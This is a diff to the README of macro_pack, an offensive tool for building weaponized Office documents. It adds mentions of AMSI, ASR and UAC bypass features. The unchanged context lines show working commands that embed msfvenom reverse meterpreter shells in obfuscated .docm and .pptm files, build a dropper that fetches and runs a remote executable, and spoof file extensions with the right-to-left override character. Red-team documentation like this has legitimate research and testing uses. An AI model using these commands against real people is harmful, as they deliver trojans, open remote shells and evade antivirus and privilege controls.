@@ -87,6 +87,7 @@ You may notice that not all part of macro\_pack is available. Only the community
 I fear the features in the pro version are really too much "weaponizing" the process and I do not want it available to all script kiddies out there.
 The pro mode includes features such as:
 * Advance antimalware bypass
+* ASR and AMSI bypass
 * VBOM security bypass
 * Self decoding VBA
 * MS Office persistance
@@ -258,7 +259,7 @@ echo "http://10.5.5.12/drop.exe" "dropped.exe" | macro_pack.exe -o -t DROPPER2 -
 msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --vbom-encode --keep-alive  -G  out.docm
 ```
 
-- Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass most antiviruses. 
+- Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass AMSI and most antiviruses. 
 ```bash
 msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --av-bypass --trojan -G  hotpics.pptm
 ```
@@ -326,6 +327,8 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
         If no auto start function, use --start-function option to indicate which macro to run. 
         This option is only compatible with Ms Office formats.
            
+     --uac-bypass Execute payload with high privileges if user is admin. Compatible with next templates: CMD, DROPPER, DROPPER2, DROPPER_PS, EMBED_EXE      
+     
      --unicode-rtlo=SPOOF_EXTENSION Inject the unicode U+202E char (Right-To-Left Override) to spoof the file extension when view in explorers.
         Ex. To generate an hta file with spoofed jpg extension use options: -G something.hta --unicode-rtlo=jpg
         In this case, windows or linux explorers will show the file named as: somethingath.jpg 
